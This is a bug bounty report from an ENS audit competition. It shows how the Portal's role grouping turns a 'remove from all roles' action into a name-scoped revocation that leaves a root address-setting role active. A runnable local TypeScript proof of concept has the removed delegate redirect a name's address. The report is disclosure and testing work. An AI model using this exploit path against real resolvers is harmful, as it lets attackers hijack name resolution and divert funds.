# 90071 w a critical lossy resolver role grouping makes remove user from all roles leave global role set addr active

**Submitted on Aug 22nd 2026 at 20:39:05 UTC by @crypt0n1337 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90071
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

Validated against the frozen competition application snapshot `cda79acaad59711b943fc68207ebb3f1d0ff8596` and the companion ENS V2 contract snapshot `48b3e2d39513b9dd32ef1850877a29009bc807b9`.

## Summary

The Portal Explorer groups all resolver roles held by one account into a single table row without preserving which role belongs to which EAC resource. If an account has both a root role and a name-scoped role, the sidebar:

1. labels the merged row **“Global roles (all names)”**;
2. asks the owner to **“remove this user from all roles”** and says that the action cannot be undone;
3. selects the first non-root name from that merged row; and
4. encodes one name-scoped `authorizeNameRoles(name, unionOfAllRoles, account, false)` call.

The transaction succeeds because at least one direct name-scoped role is removed. It never calls `revokeRootRoles`, so the account's root role remains active. An ordinary user-selected delegate whose root role includes `ROLE_SET_ADDR` can immediately change the address record of any name using that resolver after the owner has completed the advertised removal flow.

This report does not rely on a cache, race, stale indexer response, contract model, or hypothetical calldata interpretation. The attached deterministic PoC executes the exact calldata produced by the frozen Portal against the actual frozen `PermissionedResolver` contract on a fresh local EVM, then has the removed delegate successfully change `addr(victim.eth)` to the attacker address.

## Impact and suggested severity

The in-scope asset is **Explorer app Files**: `https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal`. The vulnerable grouping, display, confirmation, and transaction construction are all in `apps/portal` at the frozen competition commit. ENS smart contracts and the subgraph/indexer are out of scope for this report; the PoC uses the frozen contracts only as the execution oracle that proves the consequence of the Portal-generated transaction.

The exact claimed competition mapping is **Critical impact 6288: “Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters.”** The argument modified relative to the operation Alice confirms is the EAC resource scope: Portal substitutes the resource for `victim.eth` for the root resource that must also be revoked.

Alice is shown a global/all-role removal and deliberately confirms that operation. The application instead supplies a name-scoped resource parameter to the wallet. After the successful transaction, Mallory retains the exact `ROLE_SET_ADDR` authority checked by `PermissionedResolver.setAddr` and can redirect `victim.eth` to an attacker-controlled address. The root role applies to every name handled by the same resolver, so the potential blast radius is not limited to the one name selected accidentally by the UI.

Alice retains root admin authority and can recover by discovering the problem, submitting a separate correct `revokeRootRoles` transaction, and restoring any records Mallory changed. This report does not claim a new role grant, loss of Alice's admin authority, or inability to recover. The security failure is that the application reports completion of the explicit global revocation while Mallory's prior role remains usable until Alice notices and performs that separate recovery. The PoC demonstrates the address-record overwrite and ENS resolution redirection before recovery and includes a correct-revocation control in which Mallory's identical `setAddr` call reverts.

After the indexer refresh, Mallory's surviving root-only row can reappear. If Alice notices it and runs **Remove user** a second time, the absence of a remaining non-root name makes Portal choose root scope, so that second transaction can recover the authorization state. This does not undo a resolver change Mallory made after the first successful transaction; Alice must also restore the record. The demonstrated attack transaction succeeds before any such second removal.

I also do not claim that every wallet conceals calldata. A sufficiently advanced wallet may decode `authorizeNameRoles`, the DNS-encoded name, and the role bitmap, allowing a careful user to reject. Portal's own transaction modal shows **“Remove resolver user”**, **“Remove user**

**”**, the estimated gas cost, and **“Open wallet”**; it does not show the function name, selected ENS name, role bitmap, or root-versus-name scope (`ResolverRolesSidebar.tsx:339-348`; `TransactionsOverviewContent.tsx:94-100, 168-181`; `TransactionStateContent.tsx:56-62, 110-114, 170-178`). The vulnerability is the Portal-generated mismatch: Portal labels the operation global/all-role, does not explain that it selected a single name scope, and supplies that different calldata to the connected wallet. Any additional decoding or warning supplied by an external wallet is wallet-dependent and is not claimed to be absent.

## Threat model and privileged-address boundary

Mallory is an ordinary user-selected delegate, not a project privileged actor. Alice can create this exact mixed state through the supported **Add user** UI: first **Mallory → Root (all nodes) → Set Address → Save**, then **Mallory → victim.eth → Set Text → Save**. Mallory is not a governance, strategist, protocol-operator, or project-controlled address, and no private key or project credential is leaked.

Mallory legitimately has root `ROLE_SET_ADDR` before Alice revokes her. The bug does not grant Mallory a new bit or expand that bit's contract semantics. Instead, Alice performs routine offboarding through the supported Explorer UI, confirms removal from all roles, and Portal changes the requested revocation scope so that Mallory's existing bit is not removed. Mallory then uses her own key before Alice discovers and repairs the incomplete revocation. Thus the claimed Web/App impact is the connected-wallet argument substitution, not an attack on a smart contract by a governance or protocol administrator.

## Preconditions and every victim action

The preconditions are stable on-chain state, not attacker-controlled timing:

* Alice owns/administers a permissioned resolver and can revoke its roles.
* Mallory was previously entrusted with root `ROLE_SET_ADDR`.
* Mallory also holds at least one name-scoped role for a named node shown in the same resolver overview. The PoC uses `ROLE_SET_TEXT` on the registered `victim.eth`; both role assignments are valid states supported by the contract and Portal. Portal's add-user sheet explicitly offers both **Root (all nodes)** and individual names and submits the selected scope (`ResolverAddUserSheet.tsx:127-205, 250-270`).

The complete victim interaction is:

1. Before revocation, Alice (or the resolver's previous administrator) granted the two legitimate delegations above. Those grants are the authorization being revoked, not steps Mallory induces during exploitation.
2. Alice visits `/resolver/<resolver-address>/roles`, opens Mallory's merged row, and sees **“Global roles (all names)”**.
3. Alice clicks **Remove user**.
4. Alice confirms **“Are you sure you want to remove this user from all roles? This action cannot be undone.”**
5. Alice approves the one transaction prepared by Portal.

Mallory does not need to race or modify Alice's session. After Alice's transaction succeeds, Mallory independently calls `setAddr` while the retained root role is still active.

## Production reachability

This is the normal editable Resolver Roles page:

1. `/resolver/$address/roles/` loads `resolver.roles` and `resolver.nodes` and passes them to `ResolverRolesTable` when the connected wallet can manage roles (`apps/portal/src/routes/resolver/$address/roles/index.ts:49-91`).
2. `ResolverRolesTable` calls `groupRolesByAccount(roles, buildResourceToNameMap(nodes))` (`ResolverRolesTable.tsx:102-104`).
3. `groupRolesByAccount` keys only on `account`, appends every decoded role, and unions every resolved resource name, losing the original `(resource, role)` association (`resolverRoles.ts:179-219`).
4. `ResolverRolesSidebar` selects `resolvedNames.find(name !== '(root)')`, so any mixed root/name row becomes name-scoped (`ResolverRolesSidebar.tsx:166-169`).
5. **Remove user** sends the union of `decodedRoles` with that one selected name (`ResolverRolesSidebar.tsx:307-320`).
6. `prepareRevokeResolverRolesTransaction` maps a non-empty name to ENSJS `scope: 'name'`; only an empty name maps to `scope: 'root'` (`revokeResolverRoles.ts:42-61`).
7. After the transaction manager reports completion, the sidebar is closed (`ResolverRolesSidebar.tsx:487-506`). An indexer refetch is not a check that the requested root roles became zero. Once that refetch reflects the transaction, the surviving root-only row may reveal the problem and enable a second, correctly root-scoped removal; it does not prevent Mallory from using the retained role before that recovery.

The visible safety messaging makes the scope mismatch worse:

* the table's **Name** column does display both `(root)` and `victim.eth` for the merged row (`ResolverRolesTable.tsx:65-81`). This is a visible clue, but it does not disclose that a single-scope mutation will be derived from the row, and the subsequent sidebar and confirmation expressly describe a global/all-role removal;
* any row containing `(root)` is labelled **“Global roles (all names)”** (`ResolverRolesSidebar.tsx:391-396`);
* the confirmation says **“remove this user from all roles”** and **“This action cannot be undone”** (`ResolverRolesSidebar.tsx:442-447`);
* the transaction manager labels the step **“Remove resolver user”** and **“Remove user”** and offers **“Open wallet”**, but does not expose the function, name, bitmap, or resource scope (`ResolverRolesSidebar.tsx:339-348`; `TransactionStateContent.tsx:56-62, 110-114, 170-178`);
* none of those Portal messages discloses that it selected one name and will not call `revokeRootRoles`.

## Expected operation versus Portal-generated calldata

The merged row contains two original `(resource, role)` pairs:

```
(root,       ROLE_SET_ADDR = 0x01)
(victim.eth, ROLE_SET_TEXT = 0x10)
```

To implement the confirmed **remove this user from all roles** operation, Portal must preserve those pairs and submit the equivalent of:

```solidity
revokeRootRoles(0x01, Mallory);
authorizeNameRoles(dnsEncodeName("victim.eth"), 0x10, Mallory, false);
```

Instead, the frozen production code unions the role bits, selects the first non-root display name, and produces one successful transaction:

```solidity
authorizeNameRoles(
    dnsEncodeName("victim.eth"),
    0x11, // ROLE_SET_ADDR | ROLE_SET_TEXT
    Mallory,
    false
);
```

That call can only mutate the `victim.eth` resource. Including the `0x01` bit in a name-scoped bitmap does not revoke the same bit from the root resource, so the missing `revokeRootRoles(0x01, Mallory)` is the exact scope/argument error.

## Contract execution and persistence

The contract behaves correctly for the calldata it receives:

* `authorizeNameRoles` derives one name resource and revokes only that resource (`PermissionedResolver.sol:273-293`).
* `_effectiveRoles(resource, account)` is the OR of root roles and direct resource roles, so a root bit remains effective for all names (`EnhancedAccessControl.sol:444-455`).
* `setAddr` requires `ROLE_SET_ADDR` through that effective-role check (`PermissionedResolver.sol:409-411, 665-683`).
* the correct root operation is `revokeRootRoles` (`EnhancedAccessControl.sol:160-169`).

Consequently, a successful name-scoped revocation does not expire or implicitly clear the root role. The retained bit persists across blocks and sessions until a separate authorized account explicitly revokes it. Resetting the address record without revoking the root role is insufficient because Mallory can write it again.

## Deterministic end-to-end proof of concept

Primary PoC: `ens-audit-notes/findings/portal-resolver-role-scope-collapse/poc.e2e.ts`.

It performs both the vulnerable path and a negative control:

1. deploys the frozen V2 registry tree, `UniversalResolverV2`, `VerifiableFactory`, `PermissionedResolver` implementation, and two deterministic resolver proxies on a fresh local Hardhat EVM;
2. registers `victim.eth` and `control.eth` in the actual V2 registries and assigns the corresponding resolver proxy to each name;
3. initializes Alice with all root/admin roles;
4. constructs both legitimate grants with the frozen production `prepareGrantResolverRolesTransaction` builder, decodes the resulting `grantRootRoles` / `authorizeNameRoles` calldata, and has Alice execute both transactions successfully;
5. reads both direct role bitmaps from the deployed resolver and feeds those values to the frozen production `groupRolesByAccount`;
6. applies the exact sidebar scope-selection expression;
7. obtains calldata from the frozen production `prepareRevokeResolverRolesTransaction`;
8. has Alice broadcast that exact calldata and asserts the receipt is successful;
9. reads on-chain roles and proves the name bitmap is `0x0` while root `ROLE_SET_ADDR` is still effective;
10. has Mallory actually call `setAddr(namehash('victim.eth'), attacker)` and asserts through both the resolver and `UniversalResolverV2.resolve` that the final address for the registered `victim.eth` equals the attacker; and
11. refetches the remaining root-only row, passes it through the same frozen Portal scope selection and revoke builder, and proves the second removal now encodes `revokeRootRoles`; Alice executes it, Mallory's next identical write reverts with `EACUnauthorizedAccountRoles`, Alice restores the safe record, and `UniversalResolverV2` returns the safe address; and
12. repeats the setup on a control resolver, correctly revokes the original root and name `(resource, role)` pairs, proves Mallory's `setAddr` call reverts, and proves through `UniversalResolverV2` that the safe address remains unchanged.

With sibling checkouts named `ens-competition`, `ens-contracts-v2`, and `ens-audit-notes`, run from `ens-contracts-v2/contracts` after installing and compiling that snapshot:

```powershell
..\node_modules\.bin\tsx.CMD `
  --tsconfig ..\..\ens-competition\apps\portal\tsconfig.json `
  ..\..\ens-audit-notes\findings\portal-resolver-role-scope-collapse\poc.e2e.ts
```

Expected security assertions (addresses and transaction hashes are also deterministic):

```json
{
  "result": "PASS: address-record overwrite after advertised revocation reproduced end-to-end on local ENS V2 contracts",
  "productionUi": {
    "displayedScope": "Global roles (all names)",
    "selectedNameScope": "victim.eth",
    "encodedFunction": "authorizeNameRoles",
    "encodedAuthorizeFlag": false
  },
  "vulnerablePath": {
    "removeStatus": "success",
    "directNameRolesAfterRemoval": "0x0",
    "directRootRolesAfterRemoval": "0x1",
    "rootSetAddrStillEffective": true,
    "finalResolvedAddress": "0x90F79bf6EB2c4f870365E785982e1f101E93b906",
    "universallyResolvedAddress": "0x90F79bf6EB2c4f870365E785982e1f101E93b906"
  },
  "recoveryAfterRefetch": {
    "groupedNames": ["(root)"],
    "groupedRoles": ["ROLE_SET_ADDR"],
    "selectedNameScope": "",
    "encodedFunction": "revokeRootRoles",
    "rootRolesAfterRecovery": "0x0",
    "mallorySetAddrRevert": "EACUnauthorizedAccountRoles",
    "restoredAddress": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
    "restoredUniversalAddress": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"
  },
  "correctRevocationControl": {
    "mallorySetAddrReverted": true,
    "finalResolvedAddress": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
    "universallyResolvedAddress": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"
  }
}
```

The PoC was run twice from fresh processes and produced the same resolver addresses, transaction hashes, and final state both times.

## Known-issue and root-cause deduplication

No matching root appears in the competition's published known-issue ledger:

* `QA-01`, `WEB-1257`, and `WEB-1305` concern role combinations during name/subname **transfers** that break later profile or primary-name actions. This finding is in resolver-role management, and its consequence is retained record-writing authority after an explicit revocation.
* `R2-03` and `R2-06` concern browser smart-account session/co-owner authority. This finding involves direct EAC roles on `PermissionedResolver` and a lossy cross-resource UI grouping.
* `WEB-716` concerns replacing a subregistry, not resolver-role revocation.
* The closure notice for my migration report `#90056` matched that report to earlier submission `#89249`: both carry a stale V1 subgraph owner into `managerAddress` and grant that address resolver authority during migration. The present root is different even though the downstream authority sounds similar: no stale data or migration is involved; `groupRolesByAccount` discards `(resource, role)`, and the Portal revoke path substitutes one name resource for a requested root-plus-name revocation. The affected code, trigger, state transition, and fix are all different.

The contract root-role semantics are intentional and are not the bug. The distinct root cause is the Portal's lossy account-only grouping followed by deriving a single mutation scope from the merged display names. I cannot rule out a non-public earlier competition submission, but the root is not present in the published audit, QA, or tracker entries available for deduplication. The sidebar's **Save changes** path consumes the same lossy merged row and is supporting evidence for this root, not a separate finding.

The repository test named **“should merge the same account across resources”** (`apps/portal/src/lib/roles/resolverRoles.test.ts:185`) shows that account-only display grouping is intentional. It does not test, disclose, or accept using that lossy display projection as the source of a one-resource revocation. The report's root cause is therefore not merely “roles are grouped”; it is that the mutation path discards the original `(resource, role)` pairs, unions their bitmaps, selects one display name as the only resource argument, and presents that one-resource call as removal from all roles.

## Recommended fix

Preserve the resource on every role assignment throughout the table and mutation model. The UI should either render one `(account, resource)` row at a time or construct an explicit batch with one correctly scoped revoke for every underlying `(resource, role)` pair. A root assignment must be removed with `revokeRootRoles`; a name assignment must be removed with `authorizeNameRoles(name, ..., false)`.

Before the wallet prompt, list the exact scopes and roles that will be revoked. After confirmation, verify every requested direct role bitmap on-chain rather than treating transaction success or indexer synchronization as proof that the advertised global removal occurred.

## Proof of Concept

## Proof of Concept

This is a fully local and deterministic end-to-end PoC. It executes the frozen Portal role-grant and role-revocation builders and the actual frozen ENS V2 contracts. It never touches mainnet, a public testnet, or any third-party system.

### Run

Use sibling checkouts named `ens-competition`, `ens-contracts-v2`, and `ens-audit-notes`. From `ens-contracts-v2/contracts`, after installing and compiling the frozen contract snapshot, run:

```powershell
..\node_modules\.bin\tsx.CMD `
  --tsconfig ..\..\ens-competition\apps\portal\tsconfig.json `
  ..\..\ens-audit-notes\findings\portal-resolver-role-scope-collapse\poc.e2e.ts
```

Expected result: exit code 0 and a JSON object beginning with:

```
PASS: address-record overwrite after advertised revocation reproduced end-to-end on local ENS V2 contracts
```

The PoC proves the vulnerable branch and a fixed-behavior negative control. It executes the exact Portal-generated transaction, confirms that the name-scoped role is removed while root ROLE\_SET\_ADDR remains active, lets the former ordinary user-selected delegate overwrite the registered address, verifies the attacker address through UniversalResolverV2, then performs the second correctly scoped root revocation and proves the same write reverts with EACUnauthorizedAccountRoles. It also restores the safe address and verifies it through UniversalResolverV2.

### Runnable source

```typescript
import assert from 'node:assert/strict'

import hre from '../../../ens-contracts-v2/node_modules/hardhat/dist/src/index.js'
import { deployV2Fixture } from '../../../ens-contracts-v2/contracts/test/integration/fixtures/deployV2Fixture.ts'
import {
  decodeFunctionData,
  decodeFunctionResult,
  encodeFunctionData,
  namehash,
  parseAbi,
  toFunctionSelector,
  type Address,
  type Hex,
} from '../../../ens-competition/apps/portal/node_modules/viem/_esm/index.js'
import { prepareGrantResolverRolesTransaction } from '../../../ens-competition/apps/portal/src/features/resolver/helpers/grantResolverRoles.ts'
import { prepareRevokeResolverRolesTransaction } from '../../../ens-competition/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts'
import {
  buildResourceToNameMap,
  groupRolesByAccount,
  resolverRoles,
  type ResolverRoleKey,
} from '../../../ens-competition/apps/portal/src/lib/roles/resolverRoles.ts'

const NAME = 'victim.eth'
const CONTROL_NAME = 'control.eth'
const ROOT_RESOURCE = 0n
const ALL_ROLES =
  0x1111111111111111111111111111111111111111111111111111111111111111n
const EXPLOIT_SALT = 0x90056001n
const CONTROL_SALT = 0x90056002n

const permissionedResolverAbi = parseAbi([
  'error EACUnauthorizedAccountRoles(address account, uint256 requiredRoleBitmap)',
  'function initialize(address admin, uint256 roleBitmap, bytes[] setters)',
  'function grantRootRoles(uint256 roleBitmap, address account) returns (bool)',
  'function revokeRootRoles(uint256 roleBitmap, address account) returns (bool)',
  'function authorizeNameRoles(bytes toName, uint256 roleBitmap, address account, bool grant) returns (bool)',
  'function roles(uint256 resource, address account) view returns (uint256)',
  'function hasRootRoles(uint256 roleBitmap, address account) view returns (bool)',
  'function hasRoles(uint256 resource, uint256 roleBitmap, address account) view returns (bool)',
  'function setAddr(bytes32 node, address addr)',
  'function addr(bytes32 node) view returns (address)',
])

const uiRevokeAbi = parseAbi([
  'function authorizeNameRoles(bytes name, uint256 roleBitmap, address account, bool authorize)',
  'function grantRootRoles(uint256 roleBitmap, address account)',
  'function revokeRootRoles(uint256 roleBitmap, address account)',
])

const network = await hre.network.connect()
const publicClient = await network.viem.getPublicClient()
const [aliceWallet, malloryWallet, safeWallet, attackerWallet] =
  await network.viem.getWalletClients()

assert(aliceWallet.account)
assert(aliceWallet.chain)
assert(malloryWallet.account)
assert(safeWallet.account)
assert(attackerWallet.account)

const ALICE = aliceWallet.account.address
const MALLORY = malloryWallet.account.address
const SAFE_DESTINATION = safeWallet.account.address
const ATTACKER_DESTINATION = attackerWallet.account.address
const NODE = namehash(NAME)
const CONTROL_NODE = namehash(CONTROL_NAME)

const ensV2 = await deployV2Fixture(network)

const deployResolver = async (salt: bigint) =>
  ensV2.deployPermissionedResolver({
    owner: ALICE,
    roles: ALL_ROLES,
    salt,
  })

const waitForSuccess = async (hash: Hex) => {
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  assert.equal(receipt.status, 'success')
  return receipt
}

const writeAs = async (
  wallet: typeof aliceWallet,
  resolverAddress: Address,
  functionName: string,
  args: readonly unknown[],
) => {
  const hash = await wallet.sendTransaction({
    account: wallet.account,
    to: resolverAddress,
    data: encodeFunctionData({
      abi: permissionedResolverAbi,
      functionName,
      args,
    } as Parameters<typeof encodeFunctionData>[0]),
  })
  return waitForSuccess(hash)
}

const read = async <T>(
  resolverAddress: Address,
  functionName: string,
  args: readonly unknown[],
) =>
  publicClient.readContract({
    address: resolverAddress,
    abi: permissionedResolverAbi,
    functionName,
    args,
  } as Parameters<typeof publicClient.readContract>[0]) as Promise<T>

const executeUiIntent = async (
  resolverAddress: Address,
  data: Hex,
) => {
  const hash = await aliceWallet.sendTransaction({
    account: aliceWallet.account,
    to: resolverAddress,
    data,
  })
  return waitForSuccess(hash)
}

// Obtain the exact DNS-encoded name format used by the frozen Portal builder.
const dnsNameFor = (resolverAddress: Address, name: string) => {
  const intent = prepareRevokeResolverRolesTransaction({
    resolverAddress,
    name,
    account: MALLORY,
    roles: ['ROLE_SET_TEXT'],
    walletClient: aliceWallet,
    chainId: aliceWallet.chain.id,
  })
  assert(intent.request.data)
  const decoded = decodeFunctionData({
    abi: uiRevokeAbi,
    data: intent.request.data,
  })
  assert.equal(decoded.functionName, 'authorizeNameRoles')
  return decoded.args[0]
}

const seedMixedScopeState = async (
  resolverAddress: Address,
  name: string,
  node: Hex,
) => {
  const rootGrantIntent = prepareGrantResolverRolesTransaction({
    resolverAddress,
    name: '',
    account: MALLORY,
    roles: ['ROLE_SET_ADDR'],
    walletClient: aliceWallet,
    chainId: aliceWallet.chain.id,
  })
  assert(rootGrantIntent.request.data)
  const rootGrantDecoded = decodeFunctionData({
    abi: uiRevokeAbi,
    data: rootGrantIntent.request.data,
  })
  assert.equal(rootGrantDecoded.functionName, 'grantRootRoles')
  assert.equal(rootGrantDecoded.args[0], resolverRoles.ROLE_SET_ADDR)
  assert.equal(rootGrantDecoded.args[1].toLowerCase(), MALLORY.toLowerCase())
  const rootGrantReceipt = await executeUiIntent(
    resolverAddress,
    rootGrantIntent.request.data,
  )

  const nameGrantIntent = prepareGrantResolverRolesTransaction({
    resolverAddress,
    name,
    account: MALLORY,
    roles: ['ROLE_SET_TEXT'],
    walletClient: aliceWallet,
    chainId: aliceWallet.chain.id,
  })
  assert(nameGrantIntent.request.data)
  const nameGrantDecoded = decodeFunctionData({
    abi: uiRevokeAbi,
    data: nameGrantIntent.request.data,
  })
  assert.equal(nameGrantDecoded.functionName, 'authorizeNameRoles')
  assert.equal(nameGrantDecoded.args[1], resolverRoles.ROLE_SET_TEXT)
  assert.equal(nameGrantDecoded.args[2].toLowerCase(), MALLORY.toLowerCase())
  assert.equal(nameGrantDecoded.args[3], true)
  const nameGrantReceipt = await executeUiIntent(
    resolverAddress,
    nameGrantIntent.request.data,
  )

  await writeAs(aliceWallet, resolverAddress, 'setAddr', [
    node,
    SAFE_DESTINATION,
  ])
  return {
    rootGrantFunction: rootGrantDecoded.functionName,
    rootGrantTransaction: rootGrantReceipt.transactionHash,
    nameGrantFunction: nameGrantDecoded.functionName,
    nameGrantTransaction: nameGrantReceipt.transactionHash,
  }
}

// ---------------------------------------------------------------------------
// Attack path: execute the exact calldata produced by the frozen Portal.
// ---------------------------------------------------------------------------

const vulnerableResolver = await deployResolver(EXPLOIT_SALT)
const DNS_NAME = dnsNameFor(vulnerableResolver.address, NAME)
await ensV2.setupName({
  name: NAME,
  owner: ALICE,
  resolverAddress: vulnerableResolver.address,
})
const vulnerableInitialGrants = await seedMixedScopeState(
  vulnerableResolver.address,
  NAME,
  NODE,
)

// The name is registered in the actual V2 registry tree and points to the
// resolver under test, so the final assertion can use UniversalResolverV2.
const [registeredResolver] = await ensV2.universalResolver.read.findResolver([
  DNS_NAME,
])
assert.equal(
  registeredResolver.toLowerCase(),
  vulnerableResolver.address.toLowerCase(),
)

const resourceMap = buildResourceToNameMap([{ name: NAME }])
const nameResourceHex = [...resourceMap.entries()].find(
  ([, value]) => value === NAME,
)?.[0]
assert(nameResourceHex)
const nameResource = BigInt(nameResourceHex)

// Feed the frozen UI grouper with role bitmaps read from the deployed contract,
// not hand-written values.
const rootBitmapBefore = await read<bigint>(
  vulnerableResolver.address,
  'roles',
  [ROOT_RESOURCE, MALLORY],
)
const nameBitmapBefore = await read<bigint>(
  vulnerableResolver.address,
  'roles',
  [nameResource, MALLORY],
)
assert.equal(rootBitmapBefore, resolverRoles.ROLE_SET_ADDR)
assert.equal(nameBitmapBefore, resolverRoles.ROLE_SET_TEXT)

const grouped = groupRolesByAccount(
  [
    {
      account: MALLORY,
      resource: `0x${ROOT_RESOURCE.toString(16).padStart(64, '0')}`,
      roleBitmap: `0x${rootBitmapBefore.toString(16)}`,
    },
    {
      account: MALLORY,
      resource: nameResourceHex,
      roleBitmap: `0x${nameBitmapBefore.toString(16)}`,
    },
  ],
  resourceMap,
)

assert.equal(grouped.length, 1)
const row = grouped[0]
assert.deepEqual(row.resolvedNames, ['(root)', NAME])
assert(row.decodedRoles.includes('ROLE_SET_ADDR'))
assert(row.decodedRoles.includes('ROLE_SET_TEXT'))

// Exact ResolverRolesSidebar.tsx:169 scope selection.
const roleName = row.resolvedNames.find((name) => name !== '(root)') ?? ''
assert.equal(roleName, NAME)

// Exact transaction builder used by the "Remove user" action.
const vulnerableIntent = prepareRevokeResolverRolesTransaction({
  resolverAddress: vulnerableResolver.address,
  name: roleName,
  account: MALLORY,
  roles: row.decodedRoles as ResolverRoleKey[],
  walletClient: aliceWallet,
  chainId: aliceWallet.chain.id,
})
assert(vulnerableIntent.request.data)
assert.equal(
  vulnerableIntent.request.to.toLowerCase(),
  vulnerableResolver.address.toLowerCase(),
)
const vulnerableDecoded = decodeFunctionData({
  abi: uiRevokeAbi,
  data: vulnerableIntent.request.data,
})
assert.equal(vulnerableDecoded.functionName, 'authorizeNameRoles')
assert.equal(vulnerableDecoded.args[0], DNS_NAME)
assert.equal(
  vulnerableDecoded.args[1],
  resolverRoles.ROLE_SET_ADDR | resolverRoles.ROLE_SET_TEXT,
)
assert.equal(vulnerableDecoded.args[2].toLowerCase(), MALLORY.toLowerCase())
assert.equal(vulnerableDecoded.args[3], false)

// Alice signs and broadcasts the exact UI-produced calldata. It succeeds.
const removeHash = await aliceWallet.sendTransaction({
  account: aliceWallet.account,
  to: vulnerableResolver.address,
  data: vulnerableIntent.request.data,
})
const removeReceipt = await waitForSuccess(removeHash)

// The name-scoped role is gone, but the root address-writing role persists.
const rootBitmapAfter = await read<bigint>(
  vulnerableResolver.address,
  'roles',
  [ROOT_RESOURCE, MALLORY],
)
const nameBitmapAfter = await read<bigint>(
  vulnerableResolver.address,
  'roles',
  [nameResource, MALLORY],
)
const rootAuthorityPersists = await read<boolean>(
  vulnerableResolver.address,
  'hasRootRoles',
  [resolverRoles.ROLE_SET_ADDR, MALLORY],
)
const authorityEffectiveOnVictim = await read<boolean>(
  vulnerableResolver.address,
  'hasRoles',
  [nameResource, resolverRoles.ROLE_SET_ADDR, MALLORY],
)
assert.equal(rootBitmapAfter, resolverRoles.ROLE_SET_ADDR)
assert.equal(nameBitmapAfter, 0n)
assert.equal(rootAuthorityPersists, true)
assert.equal(authorityEffectiveOnVictim, true)

// Mallory performs the post-removal attack on the actual deployed resolver.
const attackReceipt = await writeAs(
  malloryWallet as typeof aliceWallet,
  vulnerableResolver.address,
  'setAddr',
  [NODE, ATTACKER_DESTINATION],
)
const finalResolvedAddress = await read<Address>(
  vulnerableResolver.address,
  'addr',
  [NODE],
)
assert.equal(finalResolvedAddress.toLowerCase(), ATTACKER_DESTINATION.toLowerCase())

const addressLookupCalldata = encodeFunctionData({
  abi: permissionedResolverAbi,
  functionName: 'addr',
  args: [NODE],
})
const [universalAnswer, universalResolverAddress] =
  await ensV2.universalResolver.read.resolve([
    DNS_NAME,
    addressLookupCalldata,
  ])
const universallyResolvedAddress = decodeFunctionResult({
  abi: permissionedResolverAbi,
  functionName: 'addr',
  data: universalAnswer,
}) as Address
assert.equal(
  universalResolverAddress.toLowerCase(),
  vulnerableResolver.address.toLowerCase(),
)
assert.equal(
  universallyResolvedAddress.toLowerCase(),
  ATTACKER_DESTINATION.toLowerCase(),
)

// ---------------------------------------------------------------------------
// Recovery path through the same frozen Portal after the indexer refetches.
// The surviving root-only row now correctly selects the root scope.
// ---------------------------------------------------------------------------

const refreshedGrouped = groupRolesByAccount(
  [
    {
      account: MALLORY,
      resource: `0x${ROOT_RESOURCE.toString(16).padStart(64, '0')}`,
      roleBitmap: `0x${rootBitmapAfter.toString(16)}`,
    },
  ],
  resourceMap,
)
assert.equal(refreshedGrouped.length, 1)
const refreshedRow = refreshedGrouped[0]
assert.deepEqual(refreshedRow.resolvedNames, ['(root)'])
assert.deepEqual(refreshedRow.decodedRoles, ['ROLE_SET_ADDR'])

const recoveryRoleName =
  refreshedRow.resolvedNames.find((name) => name !== '(root)') ?? ''
assert.equal(recoveryRoleName, '')
const recoveryIntent = prepareRevokeResolverRolesTransaction({
  resolverAddress: vulnerableResolver.address,
  name: recoveryRoleName,
  account: MALLORY,
  roles: refreshedRow.decodedRoles as ResolverRoleKey[],
  walletClient: aliceWallet,
  chainId: aliceWallet.chain.id,
})
assert(recoveryIntent.request.data)
const recoveryDecoded = decodeFunctionData({
  abi: uiRevokeAbi,
  data: recoveryIntent.request.data,
})
assert.equal(recoveryDecoded.functionName, 'revokeRootRoles')
assert.equal(recoveryDecoded.args[0], resolverRoles.ROLE_SET_ADDR)
assert.equal(recoveryDecoded.args[1].toLowerCase(), MALLORY.toLowerCase())
const recoveryReceipt = await executeUiIntent(
  vulnerableResolver.address,
  recoveryIntent.request.data,
)
assert.equal(
  await read<bigint>(vulnerableResolver.address, 'roles', [
    ROOT_RESOURCE,
    MALLORY,
  ]),
  0n,
)

const unauthorizedSelector = toFunctionSelector(
  'EACUnauthorizedAccountRoles(address,uint256)',
).toLowerCase()
let recoveryAttackError = ''
try {
  await writeAs(
    malloryWallet as typeof aliceWallet,
    vulnerableResolver.address,
    'setAddr',
    [NODE, ATTACKER_DESTINATION],
  )
} catch (error) {
  const parts: string[] = []
  let current: unknown = error
  for (let depth = 0; current && depth < 12; depth += 1) {
    const candidate = current as {
      message?: unknown
      shortMessage?: unknown
      data?: unknown
      cause?: unknown
    }
    for (const value of [
      candidate.shortMessage,
      candidate.message,
      candidate.data,
    ]) {
      if (typeof value === 'string') parts.push(value)
    }
    current = candidate.cause
  }
  recoveryAttackError = parts.join('\n')
}
assert.match(
  recoveryAttackError.toLowerCase(),
  new RegExp(`eacunauthorizedaccountroles|${unauthorizedSelector.slice(2)}`),
)

await writeAs(aliceWallet, vulnerableResolver.address, 'setAddr', [
  NODE,
  SAFE_DESTINATION,
])
const restoredAddress = await read<Address>(
  vulnerableResolver.address,
  'addr',
  [NODE],
)
assert.equal(restoredAddress.toLowerCase(), SAFE_DESTINATION.toLowerCase())
const [restoredUniversalAnswer] = await ensV2.universalResolver.read.resolve([
  DNS_NAME,
  addressLookupCalldata,
])
const restoredUniversalAddress = decodeFunctionResult({
  abi: permissionedResolverAbi,
  functionName: 'addr',
  data: restoredUniversalAnswer,
}) as Address
assert.equal(
  restoredUniversalAddress.toLowerCase(),
  SAFE_DESTINATION.toLowerCase(),
)
